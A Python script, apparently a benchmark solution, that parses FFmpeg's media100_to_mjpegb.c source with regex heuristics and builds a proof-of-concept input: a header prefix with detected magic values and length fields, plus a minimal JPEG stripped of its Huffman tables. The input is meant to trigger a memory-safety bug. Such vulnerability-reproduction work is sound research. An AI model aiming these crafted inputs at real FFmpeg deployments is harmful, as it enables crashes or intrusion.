import os
import re
import tarfile
from typing import Dict, List, Optional, Tuple


def _read_file_from_dir(root: str, rel_path_suffix: str) -> Optional[bytes]:
    for base, _, files in os.walk(root):
        for fn in files:
            if fn == rel_path_suffix or os.path.join(base, fn).endswith(rel_path_suffix):
                path = os.path.join(base, fn)
                try:
                    with open(path, "rb") as f:
                        return f.read()
                except OSError:
                    continue
    return None


def _read_member_from_tar(tar_path: str, predicate) -> Optional[bytes]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            # Prefer shortest paths first to avoid duplicates in different subdirs
            members.sort(key=lambda m: (len(m.name), m.name))
            for m in members:
                if not m.isfile():
                    continue
                name = m.name
                if predicate(name):
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        return f.read()
                    except Exception:
                        continue
    except Exception:
        return None
    return None


def _read_text_source(src_path: str) -> Optional[str]:
    target_basename = "media100_to_mjpegb.c"

    if os.path.isdir(src_path):
        data = _read_file_from_dir(src_path, target_basename)
        if data is None:
            # Try any file containing the name
            for base, _, files in os.walk(src_path):
                for fn in files:
                    if "media100_to_mjpegb" in fn and fn.endswith(".c"):
                        try:
                            with open(os.path.join(base, fn), "rb") as f:
                                data = f.read()
                                break
                        except OSError:
                            pass
                if data is not None:
                    break
        if data is None:
            return None
        try:
            return data.decode("utf-8", "replace")
        except Exception:
            return None

    # Tarball
    data = _read_member_from_tar(src_path, lambda n: n.endswith("/" + target_basename) or n.endswith(target_basename))
    if data is None:
        data = _read_member_from_tar(
            src_path, lambda n: ("media100_to_mjpegb" in os.path.basename(n)) and n.endswith(".c")
        )
    if data is None:
        return None
    try:
        return data.decode("utf-8", "replace")
    except Exception:
        return None


def _detect_min_size(text: str) -> int:
    mins: List[int] = []
    patterns = [
        r"\b(?:pkt|in|out|packet)\s*->\s*size\s*<\s*(\d+)\b",
        r"\b(?:pkt|in|out|packet)\s*->\s*size\s*<=\s*(\d+)\b",
        r"\bsize\s*<\s*(\d+)\b",
    ]
    for pat in patterns:
        for m in re.finditer(pat, text):
            try:
                v = int(m.group(1))
            except Exception:
                continue
            if 0 < v <= (1 << 20):
                mins.append(v)
    if not mins:
        return 0
    return max(mins)


def _detect_soi_offset(text: str) -> int:
    # Look for checks against 0xFFD8 using AV_RB16/AV_RL16 and pkt->data + offset
    soi_offsets: List[int] = []

    # data + N
    for m in re.finditer(
        r"AV_R[BL]16\s*\(\s*[^)]*?\bdata\s*\+\s*(\d+)\s*\)\s*!=\s*0x\s*ff\s*d8\b",
        text,
        flags=re.IGNORECASE,
    ):
        try:
            soi_offsets.append(int(m.group(1)))
        except Exception:
            pass
    for m in re.finditer(
        r"AV_R[BL]16\s*\(\s*[^)]*?\bdata\s*\+\s*(\d+)\s*\)\s*==\s*0x\s*ff\s*d8\b",
        text,
        flags=re.IGNORECASE,
    ):
        try:
            soi_offsets.append(int(m.group(1)))
        except Exception:
            pass

    # data (no offset)
    if re.search(
        r"AV_R[BL]16\s*\(\s*[^)]*?\bdata\s*\)\s*!=\s*0x\s*ff\s*d8\b", text, flags=re.IGNORECASE
    ) or re.search(r"\bdata\s*\[\s*0\s*\]\s*==\s*0x\s*ff\b", text, flags=re.IGNORECASE):
        return 0

    if soi_offsets:
        # Prefer smallest offset
        return min(soi_offsets)

    return 0


def _detect_header_len(text: str, soi_offset: int) -> int:
    if soi_offset > 0:
        return soi_offset

    # Heuristic: find common small offsets in "data + N" and "size - N"
    counts: Dict[int, int] = {}
    for m in re.finditer(r"\bdata\s*\+\s*(\d+)\b", text):
        try:
            n = int(m.group(1))
        except Exception:
            continue
        if 0 < n <= 16:
            counts[n] = counts.get(n, 0) + 1
    for m in re.finditer(r"\bsize\s*-\s*(\d+)\b", text):
        try:
            n = int(m.group(1))
        except Exception:
            continue
        if 0 < n <= 16:
            counts[n] = counts.get(n, 0) + 1

    if not counts:
        return 0
    best_n, best_c = max(counts.items(), key=lambda kv: kv[1])
    if best_c >= 3:
        return best_n
    return 0


def _extract_mktag_requirements(text: str) -> List[Tuple[int, bytes]]:
    reqs: List[Tuple[int, bytes]] = []

    # AV_RL32(data + off) != MKTAG('a','b','c','d')
    for m in re.finditer(
        r"AV_RL32\s*\(\s*[^)]*?\bdata(?:\s*\+\s*(\d+))?\s*\)\s*!=\s*MKTAG\s*\(\s*'(.?)'\s*,\s*'(.?)'\s*,\s*'(.?)'\s*,\s*'(.?)'\s*\)",
        text,
    ):
        off_s, a, b, c, d = m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
        off = int(off_s) if off_s is not None else 0
        reqs.append((off, (a + b + c + d).encode("latin1", "ignore")))

    # AV_RB32(data + off) != MKBETAG('a','b','c','d')
    for m in re.finditer(
        r"AV_RB32\s*\(\s*[^)]*?\bdata(?:\s*\+\s*(\d+))?\s*\)\s*!=\s*MKBETAG\s*\(\s*'(.?)'\s*,\s*'(.?)'\s*,\s*'(.?)'\s*,\s*'(.?)'\s*\)",
        text,
    ):
        off_s, a, b, c, d = m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
        off = int(off_s) if off_s is not None else 0
        reqs.append((off, (a + b + c + d).encode("latin1", "ignore")))

    # Also handle == comparisons (still safe to satisfy)
    for m in re.finditer(
        r"AV_RL32\s*\(\s*[^)]*?\bdata(?:\s*\+\s*(\d+))?\s*\)\s*==\s*MKTAG\s*\(\s*'(.?)'\s*,\s*'(.?)'\s*,\s*'(.?)'\s*,\s*'(.?)'\s*\)",
        text,
    ):
        off_s, a, b, c, d = m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
        off = int(off_s) if off_s is not None else 0
        reqs.append((off, (a + b + c + d).encode("latin1", "ignore")))

    for m in re.finditer(
        r"AV_RB32\s*\(\s*[^)]*?\bdata(?:\s*\+\s*(\d+))?\s*\)\s*==\s*MKBETAG\s*\(\s*'(.?)'\s*,\s*'(.?)'\s*,\s*'(.?)'\s*,\s*'(.?)'\s*\)",
        text,
    ):
        off_s, a, b, c, d = m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
        off = int(off_s) if off_s is not None else 0
        reqs.append((off, (a + b + c + d).encode("latin1", "ignore")))

    # Deduplicate with last-wins (prefer later occurrences)
    merged: Dict[int, bytes] = {}
    for off, bs in reqs:
        merged[off] = bs
    return sorted(merged.items(), key=lambda x: x[0])


def _detect_length_field(text: str, header_len: int, reserved_offsets: List[Tuple[int, bytes]]) -> Optional[Tuple[int, str]]:
    if header_len < 2:
        return None

    reserved = set()
    for off, bs in reserved_offsets:
        for i in range(len(bs)):
            reserved.add(off + i)

    # Find small offsets where code reads 16/32-bit from data
    le32 = set()
    be32 = set()
    le16 = set()
    be16 = set()

    for m in re.finditer(r"AV_RL32\s*\(\s*[^)]*?\bdata(?:\s*\+\s*(\d+))?\s*\)", text):
        off = int(m.group(1)) if m.group(1) is not None else 0
        if 0 <= off <= header_len - 4:
            le32.add(off)
    for m in re.finditer(r"AV_RB32\s*\(\s*[^)]*?\bdata(?:\s*\+\s*(\d+))?\s*\)", text):
        off = int(m.group(1)) if m.group(1) is not None else 0
        if 0 <= off <= header_len - 4:
            be32.add(off)
    for m in re.finditer(r"AV_RL16\s*\(\s*[^)]*?\bdata(?:\s*\+\s*(\d+))?\s*\)", text):
        off = int(m.group(1)) if m.group(1) is not None else 0
        if 0 <= off <= header_len - 2:
            le16.add(off)
    for m in re.finditer(r"AV_RB16\s*\(\s*[^)]*?\bdata(?:\s*\+\s*(\d+))?\s*\)", text):
        off = int(m.group(1)) if m.group(1) is not None else 0
        if 0 <= off <= header_len - 2:
            be16.add(off)

    # Prefer 32-bit if available
    # Choose an offset that is not reserved and within header
    def choose_offset(cands, width):
        for off in sorted(cands):
            ok = True
            for i in range(width):
                if (off + i) in reserved:
                    ok = False
                    break
            if ok:
                return off
        return None

    le32_off = choose_offset(le32, 4)
    be32_off = choose_offset(be32, 4)

    # Decide endianness based on prevalence in file (rough heuristic)
    le_count = len(re.findall(r"\bAV_RL32\b", text)) + len(re.findall(r"\bAV_RL16\b", text))
    be_count = len(re.findall(r"\bAV_RB32\b", text)) + len(re.findall(r"\bAV_RB16\b", text))

    if le32_off is not None and (be32_off is None or le_count >= be_count):
        return (le32_off, "le32")
    if be32_off is not None and (le32_off is None or be_count > le_count):
        return (be32_off, "be32")

    le16_off = choose_offset(le16, 2)
    be16_off = choose_offset(be16, 2)

    if le16_off is not None and (be16_off is None or le_count >= be_count):
        return (le16_off, "le16")
    if be16_off is not None and (le16_off is None or be_count > le_count):
        return (be16_off, "be16")

    return None


def _build_minimal_jpeg(include_dht: bool) -> bytes:
    out = bytearray()
    out += b"\xFF\xD8"  # SOI

    # DQT: one 8-bit table, id 0, 64 bytes, all 1
    qt = bytes([1] * 64)
    out += b"\xFF\xDB"  # DQT marker
    out += (67).to_bytes(2, "big")  # length
    out += bytes([0x00])  # Pq=0 (8-bit), Tq=0
    out += qt

    # SOF0: baseline DCT, 8-bit precision, 1x1, 1 component
    out += b"\xFF\xC0"
    out += (11).to_bytes(2, "big")  # length
    out += bytes([8])  # precision
    out += (1).to_bytes(2, "big")  # height
    out += (1).to_bytes(2, "big")  # width
    out += bytes([1])  # components
    out += bytes([1, 0x11, 0])  # comp id=1, sampling=1x1, qtable=0

    if include_dht:
        # Minimal DC table (class 0 id 0): one code of length 2 for symbol 0
        bits_dc = [0] * 16
        bits_dc[1] = 1  # one code of length 2
        out += b"\xFF\xC4"
        out += (2 + 1 + 16 + 1).to_bytes(2, "big")
        out += bytes([0x00])  # TcTh
        out += bytes(bits_dc)
        out += bytes([0x00])

        # Minimal AC table (class 1 id 0): one code of length 2 for symbol 0x00 (EOB)
        bits_ac = [0] * 16
        bits_ac[1] = 1
        out += b"\xFF\xC4"
        out += (2 + 1 + 16 + 1).to_bytes(2, "big")
        out += bytes([0x10])  # TcTh
        out += bytes(bits_ac)
        out += bytes([0x00])

    # SOS: 1 component, use table 0/0
    out += b"\xFF\xDA"
    out += (8).to_bytes(2, "big")
    out += bytes([1])  # components in scan
    out += bytes([1, 0x00])  # comp id=1, DC=0 AC=0
    out += bytes([0, 63, 0])  # Ss, Se, AhAl

    # Entropy-coded data
    if include_dht:
        # With our minimal tables: DC size=0 => '00', AC EOB symbol => '00' => '0000', pad with 1s => 0x0F
        out += bytes([0x0F])
    else:
        out += bytes([0x00])

    out += b"\xFF\xD9"  # EOI
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        text = _read_text_source(src_path) or ""
        min_size = _detect_min_size(text)
        soi_offset = _detect_soi_offset(text)
        header_len = _detect_header_len(text, soi_offset)
        magic_reqs = _extract_mktag_requirements(text)

        # If code likely inserts DHT, omit it from input to force allocation/rewrite.
        likely_inserts_dht = ("FFD9" in text and "DHT" in text) or ("0xC4" in text) or ("dht" in text.lower())
        jpeg = _build_minimal_jpeg(include_dht=not likely_inserts_dht)

        total_len = max(min_size, header_len + len(jpeg))
        payload_len = total_len - header_len
        if payload_len < len(jpeg):
            payload_len = len(jpeg)
            total_len = header_len + payload_len

        prefix = bytearray(b"\x00" * header_len)

        # Apply extracted magic requirements within prefix
        for off, bs in magic_reqs:
            if off < 0:
                continue
            if off + len(bs) <= len(prefix):
                prefix[off : off + len(bs)] = bs

        # Set a plausible length field if detectable and doesn't overlap with magic
        lf = _detect_length_field(text, header_len, magic_reqs)
        if lf is not None:
            off, kind = lf
            try:
                if kind == "le32" and off + 4 <= header_len:
                    prefix[off : off + 4] = int(payload_len).to_bytes(4, "little", signed=False)
                elif kind == "be32" and off + 4 <= header_len:
                    prefix[off : off + 4] = int(payload_len).to_bytes(4, "big", signed=False)
                elif kind == "le16" and off + 2 <= header_len:
                    prefix[off : off + 2] = int(payload_len & 0xFFFF).to_bytes(2, "little", signed=False)
                elif kind == "be16" and off + 2 <= header_len:
                    prefix[off : off + 2] = int(payload_len & 0xFFFF).to_bytes(2, "big", signed=False)
            except Exception:
                pass

        payload = bytearray(jpeg)
        if len(payload) < payload_len:
            payload.extend(b"\x00" * (payload_len - len(payload)))

        poc = bytes(prefix + payload)

        # Hard floor to avoid over-minimization pitfalls
        if len(poc) < 16:
            poc = poc + (b"\x00" * (16 - len(poc)))

        return poc